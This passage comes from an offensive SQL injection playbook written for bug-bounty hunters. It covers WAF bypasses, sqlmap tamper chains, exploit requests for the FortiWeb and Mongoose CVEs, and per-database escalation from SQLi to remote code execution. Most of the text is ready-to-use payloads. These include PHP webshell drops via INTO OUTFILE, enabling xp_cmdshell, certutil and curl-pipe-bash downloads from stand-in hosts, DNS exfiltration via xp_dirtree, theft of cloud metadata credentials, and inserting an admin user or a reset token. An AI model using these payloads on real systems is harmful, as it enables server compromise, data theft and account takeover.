' OR jsonb_path_query('{"a":1}','$.a') = '1'::jsonb UNION SELECT passwd FROM pg_shadow-- -
```

#### MSSQL
```sql
' OR JSON_VALUE('{"a":1}','$.a')='1' UNION SELECT @@version-- -
' OR ISJSON('{"a":1}')=1 UNION SELECT name FROM sys.databases-- -
```

#### SQLite (3.38+)
```sql
' OR ('{"a":1}' -> '$.a') = 1 UNION SELECT sqlite_version()-- -
```

### 2. Body-content-type smuggling
```
Content-Type: application/json    →    {"id":"1' OR 1=1-- -"}
Content-Type: text/xml             →    <id>1' OR 1=1-- -</id>
Content-Type: application/xml      →    works on some Spring/JAX-RS servers
Content-Type: */*                  →    some WAFs skip inspection
```

### 3. Polyglot payloads (work across multiple parsing contexts)
```
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
'/**/UNION/**/SELECT/**/1,2,3/**/--/**/-
%bf%27 OR 1=1--                ← UTF-8 multibyte escape (MySQL 'addslashes' bypass)
'%00 OR 1=1--                  ← null byte
'%0aOR%0a1=1%0a--%0a-          ← newline as space
';/* */OR/* */1=1#   ← Unicode spaces
```

### 4. Comment variants
```sql
--                              ← classic
-- -                            ← MySQL strict (needs trailing space, here as -)
#                               ← MySQL only
/*...*/                         ← all DBs
/*!50000 UNION SELECT */        ← MySQL versioned (executes on MySQL ≥5.0)
/*!UNION*/ /*!SELECT*/          ← MySQL versioned without version number
;%00                            ← null-byte terminator (some parsers)
```

### 5. Keyword obfuscation
```sql
-- Inline comment
SEL/**/ECT username FR/**/OM users
UN/**/ION SE/**/LECT 1,2,3

-- Case toggling
SeLeCt UsErNaMe FrOm UsErS

-- Double encoding (when WAF decodes once, app twice)
%2527 = %27 = '
%252f%252a%2a%252f = /**/

-- Hex literal (MySQL)
SELECT * FROM users WHERE username=0x61646d696e        -- = 'admin'
SELECT 0x756e696f6e                                    -- = 'union'

-- Unicode lookalikes
ʼ (U+02BC)   ＇ (U+FF07)   ´ (U+00B4)

-- Function aliases
SLEEP → BENCHMARK / GET_LOCK / pg_sleep
SUBSTRING → SUBSTR / MID / LEFT / RIGHT
ASCII → ORD / HEX / UNHEX
CONCAT → CONCAT_WS / GROUP_CONCAT / STRING_AGG

-- Operator substitution
AND → && / %26%26
OR  → || / %7c%7c
=   → LIKE / IN / BETWEEN / REGEXP
```

### 6. HTTP Parameter Pollution (HPP)
```
GET /search?q=normal&q=' OR 1=1-- -
POST username=normal&username=' OR 1=1-- -&password=test

# WAF inspects first, app uses last (or vice versa depending on stack)
# PHP: last wins  Java/Tomcat: first wins  ASP.NET: comma-joined
```

### 7. Chunked transfer encoding
```
Transfer-Encoding: chunked

5\r\nadmin\r\n
3\r\n' O\r\n
4\r\nR 1=\r\n
3\r\n1--\r\n
0\r\n\r\n
```

### 8. Header trust bypass
Add headers WAF skips on "internal" traffic:
```
X-Forwarded-For: 127.0.0.1
X-Internal-Request: 1
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Original-Remote-Addr: 127.0.0.1
Forwarded: for=127.0.0.1
```

### 9. Auth bypass for "authenticated-only" injection
Get any low-priv account → WAFs often whitelist `Cookie: session=*` traffic → inject there.

### 10. Time-of-flight desync
Some WAFs scan in inline mode with a TIMEOUT. Send a slow first packet, payload arrives after timeout → WAF gives up but app accepts.

---

## SQLi → RCE (Per Database) — The Crown Jewel

### MySQL → RCE via `INTO OUTFILE` (web shell)
```sql
-- Check permissions
SELECT @@secure_file_priv;       -- if empty or NULL → write anywhere
SELECT @@have_outfile_writes;
SELECT user, file_priv FROM mysql.user WHERE user=USER();

-- Drop webshell
' UNION SELECT '<?php system($_GET["c"]);?>' INTO OUTFILE '/var/www/html/x.php'-- -

-- Hex-encoded shell (avoids quote-stripping)
' UNION SELECT 0x3c3f70687020737973...756e6c696e6b283f3e INTO OUTFILE '/var/www/html/x.php'-- -

-- Find writable web-root
' UNION SELECT @@datadir-- -
' UNION SELECT @@basedir-- -
```

### MySQL → RCE via UDF (legacy but lethal)
```sql
-- Upload .so via DUMPFILE
' UNION SELECT 0xELFHEADER...PAYLOAD... INTO DUMPFILE '/usr/lib/mysql/plugin/sys.so'-- -

-- Register UDF
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'sys.so';
SELECT sys_exec('id > /tmp/o');
```

### MSSQL → RCE via `xp_cmdshell`
```sql
-- Enable (if disabled)
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;-- -
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -

-- Execute
'; EXEC xp_cmdshell 'whoami'-- -
'; EXEC xp_cmdshell 'powershell -e BASE64HERE'-- -
'; EXEC xp_cmdshell 'certutil -urlcache -split -f http://A/x.exe %TEMP%\x.exe'-- -

-- Capture output (blind RCE)
'; DECLARE @r varchar(8000); CREATE TABLE #t(c varchar(8000));
INSERT INTO #t EXEC xp_cmdshell 'whoami';
SET @r = (SELECT TOP 1 c FROM #t);
EXEC master.dbo.xp_dirtree '\\'+@r+'.YOUR.oast.fun\a'-- -

-- OLE Automation alternative when xp_cmdshell disabled
'; DECLARE @shell INT; EXEC sp_OACreate 'WScript.Shell',@shell OUTPUT;
EXEC sp_OAMethod @shell,'Run',NULL,'cmd.exe /c whoami > C:\inetpub\wwwroot\o.txt'-- -

-- CLR assembly (advanced)
-- 1. Compile C# DLL with [SqlProcedure]
-- 2. EXEC sp_configure 'clr enabled',1; RECONFIGURE;
-- 3. CREATE ASSEMBLY ... FROM 0xMZ...
-- 4. CREATE PROCEDURE Exec_Cmd AS EXTERNAL NAME ...
```

### PostgreSQL → RCE via `COPY FROM PROGRAM` (superuser required)
```sql
-- Check
SELECT current_user, current_setting('is_superuser');

-- Execute
'; COPY (SELECT '') TO PROGRAM 'id > /tmp/o'-- -
'; COPY (SELECT '') TO PROGRAM 'bash -c "curl http://A/s|bash"'-- -

-- Capture output
'; CREATE TABLE cmd_o(line text);
COPY cmd_o FROM PROGRAM 'id; whoami; hostname';
SELECT * FROM cmd_o-- -

-- Non-superuser RCE via CREATE LANGUAGE + plperlu (if perl extension installed)
'; CREATE OR REPLACE FUNCTION rce(t text) RETURNS text AS $$ system $_[0]; $$ LANGUAGE plperlu;
SELECT rce('id > /tmp/o')-- -

-- Bypass non-superuser: pg_read_server_files / pg_execute_server_program role (PG ≥11)
SELECT pg_read_file('/etc/passwd');
```

### PostgreSQL → RCE via large object + libpq (CVE-2025-1094 chain)
psql interactive tool processes `\` meta-commands. If an attacker can inject through `PQescapeLiteral` via invalid UTF-8, they pipe `\! id` directly to the shell.

### Oracle → RCE via Java stored procedure
```sql
-- Requires DBA. Compile Java in DB.
BEGIN
DBMS_JAVA.GRANT_PERMISSION('SCHEMA','java.io.FilePermission','<<ALL FILES>>','read,write,execute,delete');
END;
/

CREATE OR REPLACE JAVA SOURCE NAMED jcmd AS
  import java.io.*;
  public class jcmd { public static String exec(String c) throws Exception {
    BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(c).getInputStream()));
    String l, o=""; while((l=br.readLine())!=null) o+=l+"\n"; return o; } }
/

CREATE FUNCTION jrun(c VARCHAR2) RETURN VARCHAR2 AS LANGUAGE JAVA NAME 'jcmd.exec(java.lang.String) return java.lang.String';
/

SELECT jrun('id') FROM dual;
```

### SQLite → RCE via `load_extension`
```sql
' AND (SELECT load_extension('/tmp/malicious.so','sqlite3_extension_init'))-- -
-- Requires SQLite compiled with SQLITE_ENABLE_LOAD_EXTENSION
```

---

## ⭐ FortiWeb CVE-2025-25257 — Pre-Auth SQLi → RCE Pattern (The 2025 Gold Standard)

This pattern is REUSABLE on any Linux+MySQL+Python stack where the DB user can write files.

**Request:**
```http
GET /api/fabric/device/status HTTP/1.1
Host: target
Authorization: Bearer AAAAAA'/**/UNION/**/SELECT/**/0x3c?...truncated?...INTO/**/OUTFILE/**/'../../lib/python3.10/site-packages/x.pth'/**/-- -
```

**The .pth trick:** Python's `site.py` auto-executes lines in `*.pth` files that start with `import`. Drop a `.pth` with `import os; os.system('id > /tmp/o')` into any `site-packages/` dir → next Python process executes it.

**Reusable methodology:**
1. Find any SQLi where DB user has FILE privilege (MySQL `secure_file_priv` empty).
2. Identify a Python service on the box (CGI scripts, Django manage.py, Flask runner).
3. Find `site-packages/` dir relative to MySQL `@@datadir`.
4. `INTO OUTFILE` your `.pth` payload.
5. Trigger Python execution → RCE.

---

## ⭐ Mongoose CVE-2024-53900 / CVE-2025-23061 — populate() $where → RCE

```javascript
// Vulnerable code
Article.find().populate({ path: 'author', match: req.body.filter });

// Exploit (initial)
{"$where": "global.process.mainModule.require('child_process').execSync('id > /tmp/o')"}

// Bypass of first patch (CVE-2025-23061)
{"$or":[{"$where":"global.process.mainModule.require('child_process').execSync('id > /tmp/o')"}]}
```
Hunt Mongoose targets: any Node+MongoDB app. Test populate match params with `$where` payloads.

---

## sqlmap & ghauri — 2025-2026 Recipes

### sqlmap modern usage
```bash
# From Burp request file (best practice)
sqlmap -r request.txt --dbs --batch --level=3 --risk=2

# Cloudflare bypass combo
sqlmap -r r.txt --tamper=between,randomcase,charunicodeencode,space2comment --random-agent --delay=3 --time-sec=8 --batch

# JSON-SQL WAF bypass
sqlmap -r r.txt --tamper=json2sql,space2comment --batch
# (json2sql is a custom tamper — see https://github.com/regaan/sqlmap-tamper-collection)

# Cookie injection
sqlmap -u "https://t/dash" --cookie="session=*; uid=*" --level=2 --batch

# Header injection
sqlmap -r r.txt --headers="User-Agent: *\nReferer: *" --level=3 --batch

# OOB via DNS
sqlmap -r r.txt --dns-domain=YOUR.oast.fun --dbs --batch

# Cross-DB tamper combo (try them all)
sqlmap -r r.txt --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes --batch

# Crawl entire app
sqlmap -u "https://t/" --crawl=3 --forms --dbs --batch

# Specific DB enumeration
sqlmap -r r.txt --dbms=postgresql -D target_db -T users -C "username,password" --dump --batch
```

### Ghauri (sqlmap on steroids — handles edge cases better)
```bash
pip install ghauri
ghauri -u "https://t/?id=1" --dbs --batch
ghauri -u "https://t/?id=1" --tamper=space2comment,randomcase --dbs --batch
ghauri -r r.txt --headers="User-Agent: *" --batch
```

### Modern tamper script combos by WAF

| WAF | Recommended chain |
|-----|-------------------|
| Cloudflare | `randomcase,charunicodeencode,space2comment,equaltolike` |
| AWS WAF | `between,randomcase,space2comment,charunicodeencode` |
| Imperva | `apostrophemask,space2plus,randomcase,bluecoat` |
| F5 BIG-IP | `space2morecomment,randomcase,charunicodeencode` |
| Akamai | `charunicodeencode,space2comment,multiplespaces` |
| Azure WAF | `randomcase,space2randomblank,charunicodeencode` |
| ModSecurity | `modsecurityversioned,space2comment,randomcase` |
| FortiWeb | `charunicodeencode,base64encode,space2morecomment` |

---

## Hidden Injection Points (most-missed in 2026)

1. **ORDER BY / GROUP BY / HAVING** — can't be parameterized.
2. **LIMIT / OFFSET / TOP** — same.
3. **Column / table names** when "dynamic SQL" used in reports.
4. **Filter operators** — `?filter=name:eq:value` syntax often eval'd.
5. **Cookie subvalues** — `Cookie: prefs={"sort":"name' UNION..."}`
6. **HTTP headers** — UA, Referer, X-Forwarded-For, Authorization, Host.
7. **XML/SOAP** — `<id>1' OR 1=1-- -</id>` in legacy SOAP endpoints.
8. **JSON keys** (not just values) — `{"sort_by; SELECT 1": "asc"}`.
9. **GraphQL string fields, mutation args, variables, directives**.
10. **WebSocket subscriptions** (graphql-ws, socket.io).
11. **Webhook payload fields** stored then re-queried.
12. **File upload — filename, metadata fields, CSV content** when imported to DB.
13. **CSV/Excel formula cells** that flow into SQL via import pipelines.
14. **Path segments** — `/api/users/1'/posts` (lazy routing).
15. **MQTT topics** with SQL backend (rare but lethal).
16. **gRPC request fields** (rare, paid high when found).
17. **OAuth state/scope params** when persisted to DB.
18. **Email subject/body** when stored & queried (e.g., support ticket systems).
19. **Search-history features** — saved query string + auto-replay.
20. **Scheduled report parameters** stored across sessions.

---

## SEVERITY MAP

| Finding | Severity |
|---------|----------|
| `'` produces 500 error, no extraction | Info / Low |
| Time-based 5s delay confirmed, no extraction | Medium |
| Boolean blind, no extraction | Medium |
| Union/error-based with DB version | Medium-High |
| Extract `information_schema` (table/column names) | High |
| Extract a row from a sensitive table (users.password) | High |
| Dump users + crack hashes → ATO | **Critical** |
| Stored XSS / admin insert via `'); INSERT INTO admins...` | **Critical** |
| Auth bypass via `' OR 1=1-- -` on login | **Critical** |
| `INTO OUTFILE` web shell drop → RCE | **Critical (max)** |
| `xp_cmdshell` / `COPY PROGRAM` / Python `.pth` → RCE | **Critical (max)** |
| Cross-tenant data via shared DB tenant key bypass | **Critical** |
| Pre-auth on internet-facing critical service | **Critical + KEV-tier** |

---

## EXPLOITATION CHAIN COOKBOOK

### Chain A: Blind → Schema → Dump → ATO
```
1. ' AND SLEEP(5)-- -                                  ← confirm blind
2. ' AND (SELECT 1 FROM users LIMIT 1)=1-- -            ← confirm table
3. Extract users.email + users.password_hash via binary-search ASCII
4. Crack hash with hashcat
5. Login as admin → Critical
```

### Chain B: Error-based → File-write webshell → RCE
```
1. Error-based confirmed via extractvalue
2. SELECT @@secure_file_priv → empty
3. ' UNION SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/x.php'
4. curl https://t/x.php?c=id → "uid=33(www-data)"
5. → Critical
```

### Chain C: MSSQL → xp_cmdshell → Domain
```
1. WAITFOR DELAY '0:0:5' confirmed
2. Enable xp_cmdshell via sp_configure
3. xp_cmdshell 'whoami' → "nt service\mssql$"
4. Use SeImpersonatePrivilege → JuicyPotato/PrintSpoofer → SYSTEM
5. → Critical + domain pivot
```

### Chain D: Second-order → Admin account silent insert
```
1. Register with username = "'); INSERT INTO users(username,password,role) VALUES('h','$2y$10$X','admin');-- "
2. Trigger profile-edit endpoint that concats stored username into SQL
3. New admin user 'h' silently inserted
4. Login as 'h' → admin → Critical
```

### Chain E: JSON-SQL WAF bypass → Database dump
```
1. Direct ' OR 1=1 → blocked by AWS WAF
2. {"q":"'-(SELECT IF((SELECT JSON_LENGTH('{}'))=0,SLEEP(5),0))-- -"}
3. → 5s delay → confirmed
4. JSON-wrapped union extracts entire schema
5. → Critical with bypass note
```

### Chain F: SQLi → SSRF → Cloud creds
```
1. PostgreSQL SQLi confirmed
2. '; COPY (SELECT '') TO PROGRAM 'curl http://169.254.169.254/latest/meta-data/iam/security-credentials/'-- -
3. AWS instance metadata returned
4. Use creds → S3 / EC2 / further pivot
5. → Critical chain
```

### Chain G: GraphQL WebSocket SQLi → PII leak
```
1. Identify graphql-ws endpoint
2. Subscribe with injected string arg
3. Error-based extraction over WS frame
4. Mass-extract documents/PII
5. → Critical
```

### Chain H: Header SQLi (Authorization Bearer) → RCE via .pth (FortiWeb pattern)
```
1. Authorization: Bearer AAAA'/**/OR/**/1=1-- -  → 200 OK
2. Authorization: Bearer AAA'/**/UNION/**/SELECT/**/SHELLCODE/**/INTO/**/OUTFILE/**/'../site-packages/x.pth'-- -
3. Trigger Python CGI → .pth executes
4. RCE as root → Critical
```

### Chain I: Prisma operator injection → Auth bypass
```
1. Login POST with body: {"email":{"startsWith":""},"password":{"startsWith":""}}
2. Prisma where condition becomes: WHERE email LIKE '%' AND password LIKE '%' → returns first row
3. Bypassed auth as first user (often admin) → Critical ATO
```

### Chain J: SQLi → Insert password-reset token for admin → ATO
```
1. Time-based SQLi confirmed
2. '; INSERT INTO password_reset_tokens(user_id, token, expires) VALUES (1, 'KNOWN_TOKEN', NOW()+'1 day')-- -
3. Visit /reset?token=KNOWN_TOKEN → set new admin password
4. Login as admin → Critical
```

---

## VALIDATION GATES (Triage-Ready)

### Gate 1: What can the attacker DO right now?
At minimum: extract DB version OR cause provable 5s delay OR extract one row of sensitive data. A simple "single quote causes 500" is informational only.

### Gate 2: What does the victim LOSE?
Name the specific table + sensitive column. "Database could be accessed" weakens reports. "users.password_hash row for admin@target.com was extracted" is the language.

### Gate 3: 10-minute reproduction?
- Single curl or Burp request that demos
- Statistical confirmation (5 trials each side, non-overlapping confidence intervals) for time-based
- OOB callback with unique marker for blind+OOB
- Cracked hash or extracted row for union/error-based

### Gate 4: Impact ladder included?
Always end the report with the next escalation: "If escalated via INTO OUTFILE, this becomes pre-auth RCE due to www-data being writable to /var/www."

---

## HACKERONE DISCLOSED REPORTS — TOP 30 (mined 2026-05)

| # | Target | Type | Bounty | Vector |
|---|--------|------|--------|--------|
| 1 | Valve (Steam) | Array param SQLi | **$25,000** | `countryFilter[]=` array bypassed parameterization |
| 2 | Mail.ru (city-mobil) | Time-based blind | **$15,000** | Public param, pg_sleep |
| 3 | Mail.ru (fleet.city-mobil) | Time-based | **$10,000** | Same product family, different endpoint |
| 4 | Mail.ru (news.mail.ru) | Unauthenticated | **$7,500** | Pre-auth public news API |
| 5 | Mail.ru (windows10.hi-tech) | Cookie SQLi | **$5,000** | Cookie param concat |
| 6 | Mail.ru (turboslim.lady) | Blind | **$5,000** | Same family |
| 7 | Eternal / Zomato | Numeric ID | **$4,500** | `item_id` concat in PHP |
| 8 | Grab (drivegrab) | Search SQLi | **$4,500** | Public search endpoint |
| 9 | inDrive (id.indrive) | Blind | **$4,134** | Account ID flow |
| 10 | Razer (api.easy2pay) | Signature bypass | **$4,000** | Auth signature flaw + SQLi |
| 11 | Razer (orderid) | Error-based | **$2,000** | Direct order ID concat |
| 12 | Razer (txid) | Error-based | **$2,000** | Transaction ID |
| 13 | Razer (period-hour) | Date param | **$2,000** | Date concat in PostgreSQL |
| 14 | Razer (inviteFriend) | ORDER BY | **$2,000** | Sort param injectable |
| 15 | InnoGames | Blind boolean | **$2,000** | Length differential |
| 16 | Zomato/Eternal (hyperpure) | Error-based | **$2,000** | Different acquisition asset |
| 17 | Mail.ru (city-mobil v2) | Blind | **$2,000** | Earlier same-target finding |
| 18 | Acronis (admin.acronis.host) | Auth SQLi | **$250** | Dev service exposed |
| 19 | Starbucks (enterprise DB) | Union | $0 (high-impact) | Enterprise accounting/payroll DB |
| 20 | Starbucks (test API) | Blind→RCE | $0 | Unauth dev API → RCE chain |
| 21 | QIWI (contactws) | Stacked → RCE | $0 | MSSQL `xp_cmdshell` via SOAP |
| 22 | HackerOne self (GraphQL) | UUID arg | $0 | embedded_submission_form_uuid |
| 23 | GSA Bounty (data.gov) | User-Agent | $0 | UA header concat |
| 24 | U.S. DoD | Blind | $0 | Public param |
| 25 | U.S. Dept of State | Time-based | $0 | Public search |
| 26 | Pornhub | Comment "like" | $0 | Profile flag feature |
| 27 | Automattic (intensedebate) | Union-based | $0 | Comment plugin SQLi |
| 28 | Automattic (wp) | Union-based | $0 | WordPress core/plugin |
| 29 | ImpressCMS | SQLi via search | $0 | OSS CMS |
| 30 | MTN (path SQLi) | Path-segment | $0 | URL path injection rare class |

---

## REAL 2025-2026 WRITEUPS & PATTERNS

| Source | Pattern | Key insight |
|--------|---------|-------------|
| WatchTowr Labs (CVE-2025-25257) | Authorization Bearer SQLi → INTO OUTFILE → Python .pth → RCE | Header injection + file write + Python auto-load |
| Rapid7 (CVE-2025-1094) | psql libpq invalid-UTF-8 escape bypass → `\!` meta-command | Encoding edge cases in escape funcs are still mined |
| Aikido (Prisma 2025) | Operator injection via JSON body (`{"email":{"startsWith":""}}`) | NoSQL-style auth bypass on PostgreSQL via ORM |
| Snyk (Sequelize CVEs) | `replacements` array bypass | ORM safety methods have edge cases |
| Ahmed Ghadban (Medium Apr 2026) | IDOR → GraphQL WebSocket → PostgreSQL error-based | Modern WS endpoint, error-based SQLi |
| Ahmad Yussef (Medium Feb 2026) | Critical SQLi via Origin/Referer header bypass | Trusted-header bypass for WAF |
| Marx Chryz (Medium) | First critical via time-based blind | Statistical 5-trial confirmation methodology |
| Team82 / Claroty (2022→2025 follow-ups) | JSON-SQL bypasses AWS, CF, F5, Imperva, PAN | Vendor lists patched but byways remain |
| Mongoose CVE-2024-53900 / CVE-2025-23061 | populate $where → RCE | NoSQLi → server-side JS → command exec |
| BeyondTrust (Treasury breach 2025) | PG libpq → BeyondTrust RS → US Treasury | Real-world chain of SQLi → RCE → APT campaign |

---

## ANTI-PATTERNS — Stop Submitting These (auto-rejected 2026)

- `'` produces an error message with no extraction proven
- Stacktrace leak alone with no controlled data extraction
- "Could be SQLi" / "Probably injectable" without working PoC
- Time-based with 1/5 trials matching delay (noise, not signal)
- SQLi in *internal* error endpoint with no user impact
- DB version disclosure alone (Info / Low — bundle with extraction)
- 5xx response when sending `'` — show data, not crashes
- `sqlmap detected possible SQLi` output without manual confirmation
- SQLi behind an admin login when you don't have admin (no real impact)
- "WAF rejected my payload" — that's not a finding, that's the WAF doing its job

---

## REPORTING TEMPLATE

```
**Title:** [DB-type] [type] SQL injection in <endpoint> via <parameter> — [data extracted / RCE achieved]

**Impact summary (1-2 sentences):**
Unauthenticated time-based blind SQL injection in `<endpoint>` via the `<param>` parameter
allows extraction of arbitrary data from the PostgreSQL database. Verified by extracting
the first row of the `users` table (specifically `<safe-non-sensitive-column>`).

**Repro (verbatim):**
1. <curl/Burp request, complete, copy-pasteable>
2. Baseline: 5 trials → response time 0.18s ± 0.04s
3. Inject `' AND (SELECT pg_sleep(5))-- -` → 5 trials → response time 5.21s ± 0.06s
4. Extract DB version: `' AND (SELECT pg_sleep(IF(SUBSTRING((SELECT version()),1,3)='Pos',5,0)))-- -`
5. → 5.x second delay confirms PostgreSQL.
6. <screenshot of one extracted (non-sensitive) row>

**Impact ladder:**
- Direct: full read of users (including password_hash), orders, transactions
- Escalation: if pg_execute_server_program role granted → COPY FROM PROGRAM → RCE
- Tested: cracked one weak hash → logged in as test-victim

**CVSS 3.1:** AV:N / AC:L / PR:N / UI:N / S:U / C:H / I:H / A:H = **9.8 Critical**

**Suggested fix:** Use parameterized queries (`$1`, `$2`) instead of string interpolation in `<file:line>`.
```

---

## FALLBACK CHAIN (when stuck)

1. Test `'` on every parameter (including headers + cookies + JSON keys + GraphQL args).
2. If 500 → check error string → identify DB.
3. Try boolean: `' AND 1=1` vs `' AND 1=2`. Diff in body/length/status?
4. Try time: per-DB sleep. Statistical confirmation required.
5. Try JSON-SQL wrap if WAF blocks normal payload.
6. Try tamper combos via sqlmap for the specific WAF vendor.
7. Try header injection (`Authorization`, `Cookie`, `User-Agent`, `Referer`).
8. Try OOB (xp_dirtree / UTL_HTTP / COPY PROGRAM nslookup) for blind-only targets.
9. Try ORM-specific patterns (Prisma operator, Sequelize replacements, ORDER BY).
10. Try GraphQL inline + WebSocket subscriptions.
11. Try second-order — store payload, trigger via second feature 24h later.
12. Escalate to RCE: `INTO OUTFILE`, `xp_cmdshell`, `COPY PROGRAM`, Python `.pth`.
13. Chain to ATO: forge password-reset token, insert admin account, edit role table.

---

## CROSS-REFERENCES (load these when chaining)

- `hunt-rce` — `INTO OUTFILE`, `xp_cmdshell`, `COPY PROGRAM`, Python `.pth` chains
- `hunt-nosql` — Mongoose `$where`, MongoDB operator injection
- `hunt-graphql` — Schema introspection + WebSocket subscriptions
- `hunt-auth-bypass` — `' OR 1=1` on login is auth bypass
- `hunt-idor` — Once you read users.uuid, IDOR at scale
- `hunt-ssrf` — PostgreSQL `COPY PROGRAM 'curl http://169.254.169.254/...'` chain
- `hunt-bac-privesc` — `INSERT INTO admin_users` via SQLi
- `hunt-ato` — Forge password-reset token / change email row → ATO
- `hunt-second-order` — Stored payload class
- `security-arsenal` — Full SQLi payload tree + WAF tamper inventory
- `triage-validation` — Statistical confirmation gates
- `critical-attack-matrix` — Cross-pattern attack chains

---

## GOLDEN HEURISTICS

- "Test the headers — every WAF rule starts at the URL." — modern axiom
- "JSON wrap first, tamper second, sqlmap last." — bypass workflow
- "ORDER BY can never be parameterized — always test it."
- "Mongoose populate match accepts $where — always test it post-CVE-2024-53900."
- "Prisma `.findFirst({where: req.body})` is the new auth bypass."
- "Pre-auth + INTO OUTFILE = KEV-tier finding."
- "If the DB user has FILE privilege, SQLi is RCE — go find a writable path."
- "Time-based without statistical proof is noise. 5-and-5 with non-overlap is proof."
- "Second-order eats 80% of WAFs because the WAF only sees the safe insert."
- "GraphQL string args are unparameterized 50% of the time — test them all."
- "Header → DB → file system → Python `.pth` → root. That's FortiWeb. Reuse it."
- "When `sqlmap` says 'probably injectable' but won't dump, switch to ghauri."
